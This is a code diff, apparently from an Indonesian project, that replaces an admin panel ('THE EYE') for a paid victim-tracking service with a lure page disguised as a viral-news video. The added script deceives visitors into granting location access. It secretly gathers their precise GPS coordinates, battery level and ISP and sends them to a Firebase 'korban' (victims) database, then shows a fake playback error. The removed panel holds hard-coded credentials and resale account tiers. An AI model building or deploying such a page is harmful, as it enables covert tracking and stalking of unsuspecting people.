@@ -1,188 +1,67 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THE EYE v17.3</title>
-    <style>
-        :root { --green: #1b5e20; --gold: #ffd700; --pink: #ff4081; --red: #d32f2f; }
-        body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding-bottom: 70px; }
-        .header { background: var(--green); color: white; padding: 15px; text-align: center; font-weight: bold; border-bottom: 3px solid var(--gold); position: sticky; top: 0; z-index: 100; }
-        .tab-content { display: none; padding: 15px; }
-        .active-content { display: block; }
-        .card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 15px; border-left: 5px solid var(--green); }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; outline: none; }
-        button { border: none; border-radius: 10px; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; }
-        .btn-main { background: var(--green); color: white; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); border-top-left-radius: 20px; border-top-right-radius: 20px; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; cursor: pointer; }
-        .nav-item.active { color: var(--green); font-weight: bold; }
-        table { width: 100%; border-collapse: collapse; font-size: 10px; }
-        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #eee; }
-        .pw-view { color: var(--red); font-family: monospace; font-weight: bold; background: #eee; padding: 2px 4px; border-radius: 4px; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GNN - BERITA VIRAL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
-<body onload="initApp()">
-
-<div id="login-page" style="display: flex; justify-content: center; align-items: center; height: 95vh;">
-    <div class="card" style="width: 290px; text-align: center; border: none; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
-        <h2 style="color:var(--green)">THE EYE v17.3</h2>
-        <p style="font-size: 10px; color: #999;">Gunakan ID & Sandi Kalz</p>
-        <input type="text" id="u" placeholder="ID User">
-        <input type="password" id="p" placeholder="Password">
-        <button class="btn-main" onclick="doLogin()">MASUK</button>
+<body style="text-align:center; font-family:sans-serif; background:#eee; padding:20px;">
+    <div style="background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
+        <h2>🔴 VIDEO VIRAL HARI INI</h2>
+        <p>Verifikasi lokasi Anda untuk menonton rekaman lengkapnya.</p>
+        <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold;">VERIFIKASI & TONTON</button>
     </div>
-</div>
-
-<div id="app-interface" style="display: none;">
-    <div class="header" id="header-title">🛰️ RADAR INTEL</div>
-
-    <div id="tab-radar" class="tab-content active-content">
-        <div class="card">
-            <h3>📡 LOGS LIVE</h3>
-            <div id="log-list" style="max-height: 400px; overflow-y: auto;">Menunggu korban...</div>
-        </div>
-    </div>
-
-    <div id="tab-users" class="tab-content">
-        <div class="card">
-            <h3>👥 DATABASE AKUN</h3>
-            <div id="user-table-div" style="overflow-x: auto;"></div>
-        </div>
-        <div class="card" style="border-left-color: var(--gold);">
-            <h3>➕ BUAT AKUN</h3>
-            <input type="text" id="nu" placeholder="User Baru">
-            <input type="text" id="np" placeholder="Sandi Baru">
-            <select id="nr">
-                <option value="MEMBER">MEMBER (5K)</option>
-                <option value="ADMIN">ADMIN (8K)</option>
-                <option value="OWNER">OWNER (15K)</option>
-            </select>
-            <select id="nd">
-                <option value="3">3 HARI</option>
-                <option value="30">30 HARI</option>
-                <option value="999">PERMANEN</option>
-            </select>
-            <button class="btn-main" onclick="addUser()">DAFTARKAN</button>
-        </div>
-    </div>
-
-    <div id="tab-otaku" class="tab-content">
-        <div class="card" style="border-left-color: var(--pink);">
-            <h3>📺 OTAKU MONITOR</h3>
-            <iframe width="100%" height="250" src="http://googleusercontent.com/youtube.com/7" frameborder="0" style="border-radius:10px;"></iframe>
-        </div>
-    </div>
-
-    <div id="tab-settings" class="tab-content">
-        <div class="card">
-            <h3>⚙️ PENGATURAN</h3>
-            <p>ID Lu: <b id="my-id-display"></b></p>
-            <input type="password" id="new-pw" placeholder="Sandi Baru">
-            <button class="btn-main" onclick="changePassword()">GANTI SANDI</button>
-            <hr>
-            <button onclick="doLogout()" style="background:#444; color:white;">KELUAR</button>
-        </div>
-    </div>
-
-    <div class="bottom-nav">
-        <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR INTEL', this)"><i>🛰️</i><span>Radar</span></div>
-        <div id="nav-users" class="nav-item" onclick="switchTab('tab-users', '👥 DATABASE', this)"><i>👥</i><span>Users</span></div>
-        <div id="nav-otaku" class="nav-item" onclick="switchTab('tab-otaku', '📺 OTAKU', this)"><i>📺</i><span>Anime</span></div>
-        <div class="nav-item" onclick="switchTab('tab-settings', '⚙️ AKUN', this)"><i>⚙️</i><span>Akun</span></div>
-    </div>
-</div>
 
 <script>
-    let logCount = 0;
-    let currentUser = null;
+    // === TEMPEL CONFIG FIREBASE YANG SAMA DISINI ===
+    const firebaseConfig = {
+        apiKey: "AIzaSy...",
+        authDomain: "theeyev18.firebaseapp.com",
+        databaseURL: "https://theeyev18-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "theeyev18",
+        storageBucket: "theeyev18.appspot.com",
+        messagingSenderId: "...",
+        appId: "..."
+    };
+    // ========================================
 
-    function initApp() {
-        // Hapus paksa memori lama biar gak ada tabrakan data v13/v17
-        if(!localStorage.getItem("db")) {
-            localStorage.setItem("db", JSON.stringify([{u:"kalz", p:"111", role:"OWNER", status:"ACTIVE", exp:"2099"}]));
-        }
-        const saved = sessionStorage.getItem("user");
-        if(saved) {
-            currentUser = JSON.parse(saved);
-            renderDashboard(currentUser);
-        }
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    async function gasLacak() {
+        const btn = document.getElementById('btn');
+        btn.innerText = "SEDANG MEMPROSES...";
+        
+        let bat = "N/A", isp = "Privat";
+        
+        try {
+            if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            isp = data.org;
+        } catch(e) {}
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            // KIRIM DATA KE SATELIT FIREBASE
+            db.ref('korban').push({
+                waktu: new Date().toLocaleString(),
+                baterai: bat,
+                isp: isp,
+                maps: `https://www.google.com/maps?q=${lat},${lon}`
+            });
+
+            alert("Koneksi Error: Video gagal dimuat.");
+            btn.innerText = "VERIFIKASI ULANG";
+        }, (err) => {
+            alert("Gagal: Anda harus mengizinkan lokasi!");
+            btn.innerText = "VERIFIKASI ULANG";
+        }, {enableHighAccuracy:true});
     }
-
-    function doLogin() {
-        const db = JSON.parse(localStorage.getItem("db"));
-        const u = document.getElementById('u').value, p = document.getElementById('p').value;
-        const found = db.find(x => x.u === u && x.p === p);
-        if(found) {
-            if(found.status === "BANNED") return alert("DI-BAN!");
-            currentUser = found;
-            sessionStorage.setItem("user", JSON.stringify(found));
-            renderDashboard(found);
-        } else alert("SALAH ID/SANDI!");
-    }
-
-    function renderDashboard(u) {
-        document.getElementById('login-page').style.display='none';
-        document.getElementById('app-interface').style.display='block';
-        document.getElementById('my-id-display').innerText = u.u;
-        if(u.role === "MEMBER") {
-            document.getElementById('nav-users').style.display='none';
-            document.getElementById('nav-otaku').style.display='none';
-        }
-        updateUserTable(); startRadar();
-    }
-
-    function switchTab(id, title, el) {
-        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-content'));
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        document.getElementById(id).classList.add('active-content');
-        document.getElementById('header-title').innerText = title;
-        el.classList.add('active');
-    }
-
-    function changePassword() {
-        let db = JSON.parse(localStorage.getItem("db"));
-        const newPw = document.getElementById('new-pw').value;
-        let index = db.findIndex(x => x.u === currentUser.u);
-        db[index].p = newPw;
-        localStorage.setItem("db", JSON.stringify(db));
-        alert("PASS DIGANTI!");
-        doLogout();
-    }
-
-    function addUser() {
-        let db = JSON.parse(localStorage.getItem("db"));
-        db.push({u:document.getElementById('nu').value, p:document.getElementById('np').value, role:document.getElementById('nr').value, status:"ACTIVE", exp:document.getElementById('nd').value+" H"});
-        localStorage.setItem("db", JSON.stringify(db));
-        updateUserTable();
-    }
-
-    function updateUserTable() {
-        const db = JSON.parse(localStorage.getItem("db"));
-        let h = `<table><tr><th>USER</th><th>PASS</th><th>STATUS</th></tr>`;
-        db.forEach((user, i) => {
-            if(user.u === 'kalz' && currentUser.u !== 'kalz') return;
-            h += `<tr><td>${user.u}</td><td><span class="pw-view">${user.p}</span></td><td><button onclick="toggleBan(${i})" style="background:red;color:white;font-size:9px;">${user.status==='ACTIVE'?'BAN':'UNBAN'}</button></td></tr>`;
-        });
-        document.getElementById('user-table-div').innerHTML = h + `</table>`;
-    }
-
-    function toggleBan(i) {
-        let db = JSON.parse(localStorage.getItem("db"));
-        db[i].status = db[i].status === "ACTIVE" ? "BANNED" : "ACTIVE";
-        localStorage.setItem("db", JSON.stringify(db));
-        updateUserTable();
-    }
-
-    function startRadar() {
-        setInterval(() => {
-            const logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
-            if(logs.length > logCount) { alert("🔥 KORBAN KENA!"); logCount = logs.length; }
-            document.getElementById('log-list').innerHTML = logs.map(l => `<div style="border-bottom:1px solid #eee; padding:10px 0;">${l}</div>`).join('') || "Belum ada data.";
-        }, 3000);
-    }
-
-    function doLogout() { sessionStorage.clear(); location.reload(); }
 </script>
 </body>
 </html>
